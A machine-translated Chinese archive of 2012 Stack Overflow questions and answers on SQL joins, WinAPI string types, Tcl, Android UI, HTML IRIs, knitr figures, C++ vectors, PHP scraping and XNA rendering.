## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T20:56:54.880

需要解决的一个问题是这些查询之一是否可以成为“驱动程序”，在我们没有`file_id`一个或多个查询返回的给定行的情况下。（例如，可能有来自 的行`sess`，但没有来自 的行`file_payments`。如果我们想确保包括`file_id`出现在任何查询中的所有可能，我们可以通过如下查询获得所有可能的列表`file_id`：

```
SELECT ss.file_id FROM sess ss
 UNION 
SELECT fc.file_id FROM file_charges fc
 UNION 
SELECT fp.file_id FROM file_payments fp 
```

（注意：UNION 运算符将删除所有重复项）

要获得指定的结果集，我们可以使用该查询以及其他三个原始查询的“左连接”。查询的大纲将是：

```
SELECT a.file_id, p.total_payment - ( s.total + c.total_charges)
  FROM a
  LEFT JOIN s ON s.file_id = a.file_id
  LEFT JOIN c ON c.file_id = a.file_id
  LEFT JOIN p ON p.file_id = a.file_id
 ORDER BY a.file_id 
```

在该语句`a`中是获取所有`file_id`值集的查询的替代（如上所示）。、和分别代表 sess、file_charges 和 file_payments 上的三个原始查询`s`。`c``p`

如果任何`file_id`查询中的任何值“缺失”，我们将需要用零替换缺失值。我们可以使用 IFNULL 函数来为我们处理。

此查询应返回指定的结果集：

```
SELECT a.file_id
     , IFNULL(p.total_payment,0) - ( IFNULL(s.total,0) + IFNULL(c.total_charges,0)) AS t
  FROM ( -- all possible values of file_id
         SELECT ss.file_id FROM sess ss
          UNION 
         SELECT fc.file_id FROM file_charges fc
          UNION 
         SELECT fp.file_id FROM file_payments fp
       ) a
  LEFT
  JOIN ( -- the amount that a specific student should pay
         SELECT sess.file_id,  SUM(sess.rate * sess.length) AS total
           FROM sess
          WHERE sess.sessionDone = 1 
          GROUP BY sess.file_id
       ) s 
    ON s.file_id = a.file_id
  LEFT
  JOIN ( -- charges 
         SELECT file_charges.file_id,  SUM(file_charges.price) AS total_charges
           FROM file_charges
          GROUP BY file_charges.file_id
       ) c
    ON c.file_id = a.file_id
  LEFT
  JOIN ( -- payments 
         SELECT file_payments.file_id,  SUM(file_payments.paymentAmount) AS total_payment
           FROM file_payments
          GROUP BY file_payments.file_id
       ) p
    ON p.file_id = a.file_id
 ORDER BY a.file_id 
```

（这个查询的解释不会很漂亮，有四个派生表。在非常大的集合上，性能可能很糟糕。但返回的结果集应该符合规范。）

`file_id`当心将所有三个表连接在一起的查询......当表中有（例如）两个（或更多）行时，可能会给出不正确的结果`file_payment`。

还有其他方法可以获得等效的结果集，但上面的查询回答了这个问题：“我怎样才能将这些查询的结果结合在一起成为一个总数”。

* * *

**使用相关子查询**

这是另一种方法，使用 SELECT 列表中的相关子查询...

```
SELECT a.file_id
     , IFNULL( ( SELECT SUM(file_payments.paymentAmount) FROM file_payments
                    WHERE file_payments.file_id = a.file_id )
           ,0)
     - ( IFNULL( ( SELECT SUM(sess.rate * sess.length) FROM sess 
                    WHERE sess.file_id = a.file_id )
             ,0)
       + IFNULL( ( SELECT SUM(file_charges.price) FROM file_charges
                    WHERE file_charges.file_id = a.file_id )
             ,0)
       ) AS tot
  FROM ( -- all file_id values 
         SELECT ss.file_id FROM sess ss
          UNION 
         SELECT fc.file_id FROM file_charges fc
          UNION 
         SELECT fp.file_id FROM file_payments fp
       ) a
 ORDER BY a.file_id 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:45:47.987

试试这个

```
 SELECT  sess.file_id,  SUM(file_payments.paymentAmount) - (SUM(sess.rate * sess.length)+SUM(file_charges.price)) as total_payment FROM sess , file_charges , file_payments 
   WHERE sess.sessionDone = 1 
  GROUP BY total_payment 
```

编辑。

```
SELECT a.file_id
 , IFNULL(p.total_payment,0) - ( IFNULL(s.total,0) + IFNULL(c.total_charges,0)) AS tot
FROM ( 
     SELECT ss.file_id FROM sess ss
      UNION 
     SELECT fc.file_id FROM file_charges fc
      UNION 
     SELECT fp.file_id FROM file_payments fp
   ) a
 LEFT JOIN ( 
     SELECT sess.file_id,  SUM(sess.rate * sess.length) AS total
       FROM sess
      WHERE sess.sessionDone = 1 
      GROUP BY sess.file_id
   ) s 
ON s.file_id = a.file_id
 LEFT JOIN ( 
     SELECT file_charges.file_id,  SUM(file_charges.price) AS total_charges
       FROM file_charges
      GROUP BY file_charges.file_id
   ) c
ON c.file_id = a.file_id
LEFT JOIN ( 
     SELECT file_payments.file_id,  SUM(file_payments.paymentAmount) AS total_payment
       FROM file_payments
      GROUP BY file_payments.file_id
   ) p
 ON p.file_id = a.file_id
ORDER BY a.file_id 
```

[**在这里演示**](http://sqlfiddle.com/#!2/5cacf/1)

# c++ - 如何将 LPTSTR 转换为 LPCTSTR？

> ID：14074726
> 
> 赞同：3
> 
> 时间：2012-12-28T19:34:26.247
> 
> 标签：c++, winapi, lpcstr, lptstr

我需要转换：

[http://msdn.microsoft.com/en-us/library/windows/desktop/ms646839(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646839(v=vs.85).aspx)

```
lpstrFileTitle
Type: LPTSTR
The file name and extension (without path information) of the selected file. This member can be NULL. 
```

尽管在 MSVC++ 2012 Express 中它说它的 LPSTR。

到

[http://msdn.microsoft.com/en-us/library/windows/desktop/bb172802(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb172802(v=vs.85).aspx)

```
pSrcFile [in]
Type: LPCTSTR
Pointer to a string that specifies the filename. If the compiler settings require Unicode, the data type LPCTSTR resolves to LPCWSTR. Otherwise, the string data type resolves to LPCSTR. See Remarks. 
```

我将非常感激这一点。:)

```
char szFileName[MAX_PATH] = {0};
char szFileTitleName[MAX_PATH] = {0};
HRESULT hr = S_OK;
RtlZeroMemory(&gc.ofn, sizeof(gc.ofn));

gc.ofn.lStructSize      =   sizeof(gc.ofn);
gc.ofn.hwndOwner        =   hWnd;
gc.ofn.lpstrFilter      =   "All Image Files\0"              "*.bmp;*.dib;*.wdp;*.mdp;*.hdp;*.gif;*.png;*.jpg;*.jpeg;*.tif;*.ico\0"
"Windows Bitmap\0"               "*.bmp;*.dib\0"
"High Definition Photo\0"        "*.wdp;*.mdp;*.hdp\0"
"Graphics Interchange Format\0"  "*.gif\0"
"Portable Network Graphics\0"    "*.png\0"
"JPEG File Interchange Format\0" "*.jpg;*.jpeg\0"
"Tiff File\0"                    "*.tif\0"
"Icon\0"                         "*.ico\0"
"All Files\0"                    "*.*\0"
"\0";
gc.ofn.nMaxFileTitle = MAX_PATH;
gc.ofn.lpstrFileTitle = gc.szFileTitleName; // its a char
gc.ofn.lpstrFile       = szFileName;
gc.ofn.nMaxFile        = MAX_PATH;
gc.ofn.lpstrTitle      = "Open Image";
gc.ofn.Flags           = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

if(GetOpenFileName(&gc.ofn)) {
gc.render_on = true;
} 
```

.

```
D3DXCreateTextureFromFileEx (d3dDevice, gc.szFileTitleName , D3DX_DEFAULT_NONPOW2, D3DX_DEFAULT_NONPOW2, 0, 0,
        D3DFMT_A8R8G8B8, D3DPOOL_DEFAULT, D3DX_DEFAULT, D3DX_DEFAULT,
        colorkey, &init_map->image_info, NULL, &init_map->texture_buffer) 
```

这将有一个空白图像。我已经在 GetOpenFile 之后使用消息框对此进行了测试，并且返回效果很好。

```
MessageBoxA ( NULL , gc.ofn.lpstrFileTitle , "" , 0 ); 
```

但在 D3DXCreateTextureFromFileEx 之前，它搞砸了。

只需将字符存储到 gc.szFileTitleName 中。不知道为什么另一种方式超出了范围......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:36:37.330

`LPCTSTR`只是一个`const`版本`LPTSTR`。这种类型的转换是*标准转换*，所以你不需要明确地做任何事情来得到你想要的。您的错误必须在其他地方。

除非你以某种方式用 set 编译一段代码，`UNICODE`而有些没有它......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T21:53:28.527

`GetOpenFileName()`, `D3DXCreateTextureFromFileEx()`, 并且`MessageBox()`都处理`TCHAR`基于 - 的字符串，但您实际上并没有`TCHAR`在代码中使用。试试这个：

```
TCHAR szFileName[MAX_PATH] = {0};
TCHAR szFileTitleName[MAX_PATH] = {0};
HRESULT hr = S_OK;
RtlZeroMemory(&gc.ofn, sizeof(gc.ofn));

gc.ofn.lStructSize      =   sizeof(gc.ofn);
gc.ofn.hwndOwner        =   hWnd;
gc.ofn.lpstrFilter      =   TEXT("All Image Files\0")              TEXT("*.bmp;*.dib;*.wdp;*.mdp;*.hdp;*.gif;*.png;*.jpg;*.jpeg;*.tif;*.ico\0")
                            TEXT("Windows Bitmap\0")               TEXT("*.bmp;*.dib\0")
                            TEXT("High Definition Photo\0")        TEXT("*.wdp;*.mdp;*.hdp\0")
                            TEXT("Graphics Interchange Format\0")  TEXT("*.gif\0")
                            TEXT("Portable Network Graphics\0")    TEXT("*.png\0")
                            TEXT("JPEG File Interchange Format\0") TEXT("*.jpg;*.jpeg\0")
                            TEXT("Tiff File\0")                    TEXT("*.tif\0")
                            TEXT("Icon\0")                         TEXT("*.ico\0")
                            TEXT("All Files\0")                    TEXT("*.*\0")
                            TEXT("\0");
gc.ofn.nMaxFileTitle = MAX_PATH;
gc.ofn.lpstrFileTitle = gc.szFileTitleName;
gc.ofn.lpstrFile       = szFileName;
gc.ofn.nMaxFile        = MAX_PATH;
gc.ofn.lpstrTitle      = TEXT("Open Image");
gc.ofn.Flags           = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

if(GetOpenFileName(&gc.ofn)) {
    gc.render_on = true;
} 
```

.

```
D3DXCreateTextureFromFileEx (d3dDevice, gc.szFileTitleName , D3DX_DEFAULT_NONPOW2, D3DX_DEFAULT_NONPOW2, 0, 0, D3DFMT_A8R8G8B8, D3DPOOL_DEFAULT, D3DX_DEFAULT, D3DX_DEFAULT, colorkey, &init_map->image_info, NULL, &init_map->texture_buffer) 
```

.

```
MessageBox(NULL, gc.ofn.lpstrFileTitle, TEXT(""), 0); 
```

# tcl - Tcl 按制表符分割 (\t)

> ID：14074728
> 
> 赞同：0
> 
> 时间：2012-12-28T19:34:55.883
> 
> 标签：tcl

我正在尝试通过 TABS (\t) 拆分 Tcl 字符串。

请考虑以下事项`sampleString`：

```
I . am -> a . programmer # let "." be spaces and "->" be tabs 
```

如果我尝试执行以下操作：

```
set myVar [split $sampleString "\t"] 
```

Tcl 也会被空格分割，而不仅仅是制表符。

如何仅按标签拆分？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-29T09:33:52.787

我怀疑您对正在查看的输出有点困惑。

```
% set s "I am\ta programmer"
I am    a programmer
% split $s
I am a programmer
% split $s "\t"
{I am} {a programmer} 
```

两个 s 之间的唯一区别`split`是，如果没有可选的第二个参数，则拆分集是“全空格”（对于“全”的合理定义），并且两者都不会`split`影响变量中的值，因为没有明确的 write-回到这里。

# android - 我将如何更改 onBackStackChanged 中的选定选项卡？

> ID：14074729
> 
> 赞同：1
> 
> 时间：2012-12-28T19:34:57.590
> 
> 标签：android, tabs, android-fragments

单击后退按钮时，屏幕显示上一个片段，但操作栏中的选定选项卡没有改变，所以我可能必须在 onBackStackChanged 中设置选定的片段对吗？

但是，它不起作用，当我切换到其他选项卡时，应用程序会冻结。似乎它被同时选择了多次，因为当我记录它时，backstack 被多次更改得非常快。

我已经知道为什么会结冰了。当我设置选定的导航项时，它会再次调用 onTabSelected() ，这又会调用 backStackChanged ，这又会重复。那么如何选择要下划线的选项卡，而无需重新选择选项卡？

```
@Override
        public void onTabSelected(Tab tab, FragmentTransaction ft){

        FragmentManager manage = getSupportFragmentManager();
        manage.addOnBackStackChangedListener(new OnBackStackChangedListener(){

            @Override
            public void onBackStackChanged() {
                if(actionBar.getSelectedTab().equals(tabRed))
                    actionBar.setSelectedNavigationItem(2);
                if(actionBar.getSelectedTab().equals(tabBlue))
                    actionBar.setSelectedNavigationItem(1);
                if(actionBar.getSelectedTab().equals(tabMatches))
                    actionBar.setSelectedNavigationItem(0);

            }
        });

        if(tab.equals(tabComp))
        {
ft.setCustomAnimations(R.anim.animation_fragment_out, R.anim.animation_fragment_switch);

            trans = getSupportFragmentManager().beginTransaction();
        trans.replace(android.R.id.content, teamsFrag);

        trans.addToBackStack(null);
        trans.commit();

        }
else if(tab.equals(tabRed))
        {

            ft.setCustomAnimations(R.anim.animation_fragment_out, R.anim.animation_fragment_switch);

            trans = getSupportFragmentManager().beginTransaction();
        trans.replace(android.R.id.content, redScorerFrag);

        trans.addToBackStack(null);
        trans.commit();
            curTab = tabRed;

        } 
```

# html - IRI 作为 HTML 属性值是否有效？

> ID：14074731
> 
> 赞同：8
> 
> 时间：2012-12-28T19:35:00.960
> 
> 标签：html, utf-8, uri, urlencode

使用包含非 ASCII 字符的 IRI 作为属性值（例如，用于`href`属性）而不是 URI 是否是有效的 HTML？HTML 风格（HTML 和 XHTML，4 和 5）之间有什么区别吗？至少[RFC 3986](https://www.rfc-editor.org/rfc/rfc3986#page-16)似乎暗示它不是。

我意识到使用百分比编码可能会更安全（关于旧的和不知道 IRI 的软件），但我正在寻找关于标准的明确答案。

到目前为止，我已经使用[W3C 验证器](http://validator.w3.org/)进行了一些测试，并且 URI 中未转义的 unicode 字符不会触发 HTML 4/5 和 XHTML 4/5 文档类型的任何警告或错误（但当然没有错误消息不会） t 暗示没有错误）。

至少 chrome 还支持原始 UTF-8 IRI，但在触发 HTTP 请求之前会对其进行百分比转义。此外，我的 Web 服务器 (lighttpd) 似乎支持 UTF-8 字符的百分比编码以及 HTTP 请求中的未编码形式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-29T02:22:24.100

HTML 4.01 很简单。不同的属性对于它们可以包含的内容有不同的规则，但是如果我们正在处理`<a>`元素上的 href 属性，那么[HTML 4 规范，B.2.1 URI 属性值中的非 ASCII 字符部分](http://www.w3.org/TR/html4/appendix/notes.html#non-ascii-chars)说：

> ...以下 href 值是非法的：
> 
> `<A href="http://foo.org/Håkon">...</A>`

HTML5 是不同的。它说[IRI 是有效的，只要它们符合一些附加条件。](http://www.w3.org/html/wg/drafts/html/CR/infrastructure.html#valid-url)

> 如果至少满足以下条件之一，则 URL 是有效的 URL：
> 
> *   URL 是一个有效的 URI 参考 [RFC3986]。
>     
>     
> *   URL 是一个有效的 IRI 引用，它没有查询组件。[RFC3987]
>     
>     
> *   URL 是一个有效的 IRI 引用，其查询组件不包含未转义的非 ASCII 字符。[RFC3987]
>     
>     
> *   URL 是有效的 IRI 引用，并且 URL 文档的字符编码是 UTF-8 或 UTF-16 编码。[RFC3987]

XHTML 1.x 遵循与 HTML 4.01 相同的规则。

XHTML5 与 HTML5 相同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-29T02:30:27.000

如有疑问，请阅读官方 HTML 规范以获得明确的答案。

HTML 4 根本不支持 IRI。它们必须按照[RFC 3987 第 3.1 节](https://www.rfc-editor.org/rfc/rfc3987#section-3.1)编码为 URI ，或将非 ASCII URI 数据编码为 UTF-8，按照[HTML4 第 B.2.1 节的百分比编码](http://www.w3.org/TR/html4/appendix/notes.html#non-ascii-chars)

[根据HTML5 第 2.6 节](http://www.w3.org/html/wg/drafts/html/CR/infrastructure.html#urls)，HTML 5 在所有允许 URL 的地方都支持 URI 和 IRI 。

# r - 使用 knitr 和 RStudio 在 LaTeX pdf 中嵌入 ggplot2 输出

> ID：14074732
> 
> 赞同：18
> 
> 时间：2012-12-28T19:35:02.020
> 
> 标签：r, latex, ggplot2, knitr, rstudio

过去，我使用 RStudio 创建 ggplot2，然后从 RSudio 将它们导出为 PDF。这非常有效。

我现在正在尝试使用 knitr 实现自动化，但我无法弄清楚在哪里设置图形高度和重量以创建高质量的输出。

这是我目前的尝试，但“并排”图不是，旋转横向图不是，而且分辨率似乎很低。

我会很感激任何建议。似乎 ggplot2 和 knitr 都在积极开发中，这很好，但是，互联网搜索让我感到困惑。LaTeX 对我来说是新的。我也很欣赏这套工具的任何一般工作流程策略。提前致谢。

```
\documentclass[letterpaper]{article}
\usepackage{lscape}
\begin{document}
<<load, echo=FALSE, results='hide', warning=FALSE, message=FALSE>>=
require(ggplot2)
@ 

Two on the first page.
<<first, echo=FALSE, fig.height=3, fig.cap="This is first", fig.pos='h'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@

Blah, blah, blah.
<<second, echo=FALSE, fig.height=3, fig.cap="This is second", fig.pos='h'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@
\newpage
Second page.

Side by side images:

<<third, echo = FALSE, out.width="2in", fig.cap='Side by side'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@
\newpage
\begin{landscape}
This page is rotated
<<fourth, echo = FALSE, out.width="4in", fig.cap='Landscape'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@
\end{landscape}
\end{document} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-28T20:12:45.737

我可以带你去那里的大部分地方：

```
\documentclass[letterpaper]{article}
\usepackage{lscape}
\usepackage{float}
\begin{document}
<<load, echo=FALSE, results='hide', warning=FALSE, message=FALSE>>=
require(ggplot2)
@ 

Two on the first page.
<<first, echo=FALSE, fig.height=3, fig.cap="This is first", fig.pos='h'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@

Blah, blah, blah.
<<second, echo=FALSE, fig.height=3, fig.cap="This is second", fig.pos='h'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@

\newpage
Second page.

Side by side images:

\begin{figure}[H]
<<third, echo = FALSE, out.width="0.48\\linewidth",fig.width = 3.5,fig.height=2>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@
\caption{Side by side}
\end{figure}

\newpage
\begin{landscape}
This page is rotated.
<<fourth, echo = FALSE, fig.width = 4,fig.height = 3,out.width = "0.9\\linewidth">>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@
\end{landscape}
\end{document} 
```

质量对我来说看起来不错，但前提是我使用我的系统 PDF 查看器（预览版，OS X）。内置的 RStudio PDF 查看器过去对我有一些渲染问题，所以我不使用它。

我不确定如何强制横向页面上的图形位于文本下方。通常，我会像之前的数字一样使用 float 包来执行此操作，但它似乎不适用于横向。我建议您咨询 tex.stackexchange.com 上的相关人员，因为它是相当特定于 LaTeX 的。

不是和之间`fig.width`的相互作用。两者都玩，看看图像的大小与图像中元素的缩放比例会发生什么变化。一个影响创建时的实际图形大小，另一个影响该图像在包含在 LaTeX 文档中时的缩放方式（我认为）。`fig.height``out.width`

另请注意，我`\caption{}`在图形环境中并排使用了，否则它将尝试为每个图形创建标题。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-28T23:39:19.717

不确定旋转的第四页，但获得并排的图需要`fig.show='hold'`和`out.width='.45\\linewidth'`

```
<<third, echo = FALSE, out.width="2in", fig.cap='Side by side',out.width='.45\\linewidth',fig.show='hold'>>=
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
ggplot(mtcars, aes(mpg, wt))+geom_point()+facet_grid(vs ~ am, margins=TRUE)
@ 
```

# android - 防止删除 EditText 中的某些文本

> ID：14074733
> 
> 赞同：1
> 
> 时间：2012-12-28T19:35:03.213
> 
> 标签：android

我希望用户在我已经在 EditText 中设置的文本之后输入文本，并且该文本不能被用户删除。

例如，我在 EditText 中设置文本“名称：”，然后用户在“名称：”之后输入他们的名称

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:52:02.993

您正在以错误的方式处理此问题。

您想要的功能是将`TextView`（非可变文本）的行为与`EditText`（可变文本）结合起来。您可以通过*将 TextView 放在 EditText 上来*做到这一点。

使用相对布局，

```
<EditText
    android:id="@+id/editText1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="43dp"
    android:paddingLeft="54dp"
    android:ems="10" >

    <requestFocus />
</EditText>

<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:paddingLeft="8dp"
    android:layout_alignLeft="@+id/editText1"
    android:layout_alignBaseline="@+id/editText1"
    android:text="Name:" /> 
```

这将导致：

![在此处输入图像描述](../Images/0f11fc4fdd5cd5cd40992b6506e3e694.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-25T15:56:29.637

遵循一些基本思想，使用[InputFilter](https://developer.android.com/reference/android/text/InputFilter.html)做到这一点。

```
static class InnerFieldLabelHelper implements InputFilter, View.OnTouchListener {

    private final CharSequence label;
    private EditText editText;

    InnerFieldLabelHelper(CharSequence label) {
        this.label = label;
    }

    @Override
    public CharSequence filter(CharSequence source, int start, int end, Spanned dest, int dstart, int dend) {

        CharSequence result;
        if (dest.length() < label.length()) {
            result = label.subSequence(label.length() - 2, label.length());
        } else if (dstart >= label.length() - 1) {
            result = source;
        } else {
            result = "";
        }

        resetPositionIfNecessary();

        return result;
    }

    @Override
    public boolean onTouch(View view, MotionEvent motionEvent) {
        boolean result = false;
        if (view.equals(editText)) {
            result = resetPositionIfNecessary();
        }
        return result;
    }

    public boolean resetPositionIfNecessary() {
        boolean result = false;
        if (editText.length() >= label.length() && editText.getSelectionStart() < label.length()) {
            editText.setSelection(label.length());
            editText.requestFocus();
            result = true;
        }
        return result;
    }

    public void configure(EditText editText) {
        this.editText = editText;
        this.editText.setText(label);
        this.editText.setSelection(label.length());

        this.editText.setFilters(new InputFilter[]{ this });
        this.editText.setOnTouchListener(this);
    }
} 
```

# c++ - 带有结构的 C++ 向量不起作用？

> ID：14074734
> 
> 赞同：2
> 
> 时间：2012-12-28T19:35:04.207
> 
> 标签：c++, vector, struct, scanf

我正在处理一些文件并尝试加载它们。我想用一个向量来存储最终的信息，这样我就可以在全局范围内保存它而无需知道它有多大。这是我的代码，但程序没有完成启动：

```
std::string one = "v 100.32 12321.232 3232.6542";
struct Face {float x, y, z;};
std::vector<struct Face> obj;
char space[3];
sscanf(one.c_str(), "%s %f %f %f", space, &obj[1].x1, &obj[1].y1, &obj[1].z1);
std::cout << obj[1].x1 << std::endl; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:41:59.983

默认构造`vector`的 s 开始为空，即使编译器允许您使用`operator []`，这样做也是未定义的行为。

您可以在创建时分配一些空间`vector`：

`std::vector<struct Face> obj(2); // Allow enough space to access obj[1]`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:40:35.993

如果要写入向量中的元素 1，则向量必须具有`size() >= 2`. 在您的示例中，`size()`始终为 0。

考虑创建一个临时文件`Face`，然后将其`push_back`-ing 到`vector<Face>`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T20:42:56.553

也许您使用 sscanf 是有充分理由的，但至少我认为可以使用流将信息加载到结构中是一件好事。

在这种情况下，我建议您使用 istringstream 类，它可以让您从字符串中读取值作为值，并根据需要进行转换。所以，你的代码，我想我可以把它改成这样：

```
std::string one = "v 100.32 12321.232 3232.6542";
struct Face {float x,y,z;};
std::vector<struct Face>obj;
char space[3];

// As mentioned previously, create a temporal Face variable to load the info
struct Face tmp; // The "struct" maybe can be omited, I prefer to place it.

// Create istringstream, giving it the "one" variable as buffer for read.
istringstream iss ( one );

// Replace this line...
//sscanf(one.c_str(), "%s %f %f %f",space,&obj[1].x1,&obj[1].y1,&obj[1].z1);
// With this:
iss >> space >> tmp.x >> tmp.y >> tmp.z;

// Add the temporal Face into the vector
obj.push_back ( tmp );

// As mentioned above, the first element in a vector is zero, not one
std::cout << obj[0].x1 << std::endl; 
```

istringstream 类（您需要包含“sstream”）在这种情况下很有用，当您有要从字符串加载的值时。

我希望我的回答能以任何方式帮助你。

# php - 我正在寻找使用 php 从另一个网站提取特定内容并将其加载到我网站上的 iframe 中

> ID：14074737
> 
> 赞同：-1
> 
> 时间：2012-12-28T19:35:12.013
> 
> 标签：php, iframe

特别是我只是在寻找在几个 div 中加载的内容。

我应该使用 cURL 吗？

我知道这一点：

[http://simplehtmldom.sourceforge.net/](http://simplehtmldom.sourceforge.net/)

但不确定如何提取 div 类和 id。

```
$html = file_get_contents("http://anywhoyp.yellowpages.com/whitepages");

$dom = new DOMDocument;
$dom->loadHTML($html);

$items = $dom->getElementsByTagName('div');
for ($i = 0; $i < $items->length; $i++)
        echo $items->item($i)->nodeValue . "<br/>"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:44:20.347

好吧，file_get_contents 将为您提供不需要的完整页面源。因此，您必须在之后使用 DOM 解析器来提取您需要的内容。问题是 PHP 的 DOM 解析器太慢了。在[https://github.com/msmuenchen/wiki-staticdumps/blob/master/scripts/process.php](https://github.com/msmuenchen/wiki-staticdumps/blob/master/scripts/process.php)中，我使用 ganon 库来修改 DOM - 您应该能够从这个源代码中弄清楚如何使它适合您的需求。

# xna-4.0 - 什么是优化在 XNA 中渲染 2D 瓷砖游戏的好方法？

> ID：14074739
> 
> 赞同：1
> 
> 时间：2012-12-28T19:35:15.187
> 
> 标签：xna-4.0, 2d-games

编辑：我选择了第二种方法，因为即使所有 3 个平铺层都填满了整个屏幕，我也能获得 150+ fps。

编辑 2：我阅读了很多关于顶点缓冲区对象以及它们如何适用于静态几何的内容，尽管我仍然不知道如何将我的 2D 切片转换为 VBO 并将其存储在 GPU 内存中，但这绝对是一种方式如果其他人正在寻找一种快速渲染静态几何体/四边形的方法。

我正在制作像 Super Meat Boy 这样的游戏，并且想知道将关卡图块存储在数组列表中并进行相机边界重叠测试以查看是否应该渲染是否会更好/更快。

```
foreach(Tile tile in world.tiles) {
    if(Overlap(camera.bounds, tile))
        render(tile);
} 
```

或者存储每个网格正方形并且仅在相机边界之间读取的二维数组会更好吗？

```
int left = (int)(camera.position.x - camera.width/2);
int right = (int)(camera.position.x + camera.width/2) + 1;
int top = (int)(camera.position.y - camera.height/2); // WHY XNA DO YOU UPSIDE DOWN!!!
int bottom = (int)(camera.position.y + camera.width/2) + 1;
for(int x = left; x < right; x++) {
    for(int y = top; y < bottom; y++) {
        render(world.tiles[x][y]);
    }
} 
```

相机可以在屏幕上放置 64*36 块，使用后一种方法可以读取 2300 个奇数块，但是对关卡中的每个块进行重叠测试会更好吗？我读了一个关于将匹配的相邻图块连接成一个更大的四边形并只是重复纹理的答案（尽管我使用的是纹理图集，所以我不确定如何在纹理上重复一个区域）。

干杯，伙计们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-09T05:46:27.937

根据我过去的经验，我可以分享细节。在 2D 地图中，通常地图的长度为 0 - N。现在 N 比屏幕尺寸长得多。现在起初我试图一次加载所有内容。但这有点开销。好吧，这就像一个开销很大。我最终得到 0 FPS。因为我想要不同类型的对象。因此，即使重复相同的对象并节省内存也不起作用。然后我尝试参考屏幕来限制事物。所以，物体在那里，但它们没有被渲染。因此，它远离绘制管线。和游戏起死回生。

现在，为了进一步提高 C# 4.0 的性能，我可以使用 TPL 和 async 并使用 draw 等待。这就像更好的线程版本。所以，你可以把东西扔在那里，让它随意渲染。

这是 XNA 或任何类型的图形库的交易。有完整的图形渲染管线。这让事情变得很慢。特别是如果 PC 很旧，只有 64MB 显卡，只能支持宽屏。*您的游戏将被部署到任何类型的机器上，对吗？？！！*

所以，如果我用 XNA 的语言解释，更新是简单的代码并尽可能快地运行它，没有什么可以阻止它。但draw是前面有完整的管道。这是有开始和结束的唯一原因。所以，结束后它可以开始把东西推到管道上。[这里]（[http://classes.soe.ucsc.edu/cmps020/Winter11/readings/hlsl.pdf](http://classes.soe.ucsc.edu/cmps020/Winter11/readings/hlsl.pdf)）文章供参考。

So, here is a deal rendering pipeline is needed but there is no need that is should be slow and blocking. Just make it multi-threaded and things will quite faster for you. If you want more terse then you have to use C# at it fullest including Linked list and stuff. But that will be like last stage.

I hope I have given enough details to provide you an answer. Please let me know if any further details needed.

# sql - 如何使用 group by 仅选择一列？

> ID：14074742
> 
> 赞同：1
> 
> 时间：2012-12-28T19:35:37.753
> 
> 标签：sql, sql-server-2008, crud

我正在尝试从每个门户中仅选择**一行**（按日期排列的最后一行），但我遇到了 group by/distinct 问题

使用此代码，我只能选择我需要的 portalId，但没有任何数据

```
Select relNews.PortalId
from news
left join relNews on relNews.NewsId= news.NewsId
group by relNews.PortalId 
```

当我在此代码中添加一个或多个数据列时，选择会带来所有信息，而不仅仅是每个门户的信息

```
Select relNews.PortalId, news.NewsId
from news
left join relNews on relNews.NewsId= news.NewsId
group by relNews.PortalId, news.NewsId 
```

我知道这是我在这里遗漏的一个小技巧，但我就是不记得是什么......

## 更新

让我们为这个例子制作虚拟表。桌子是`news`和`relNews`（我在这里尽可能短）

**表新闻**

*   新闻ID
*   标题
*   描述
*   日期

**表相关新闻**

*   RelNewsId
*   新闻ID
*   PortalId

**笔记：**

*   relNews 可以有`N`相同 NewsId 的寄存器
*   我需要为每个 portalId 选择最后一个寄存器（基于 news.Date）。

让我们说：

**表新闻**

*   新闻 ID == 1
*   标题 == '测试'
*   描述 == '测试'
*   日期 == '2013-01-01 00:00:00'

*   新闻 ID == 2

*   标题 == 'test2'
*   说明 == 'test2'
*   日期 == '2013-01-01 03:00:00'

*   新闻 ID == 3

*   标题 == 'test3'
*   说明 == 'test3'
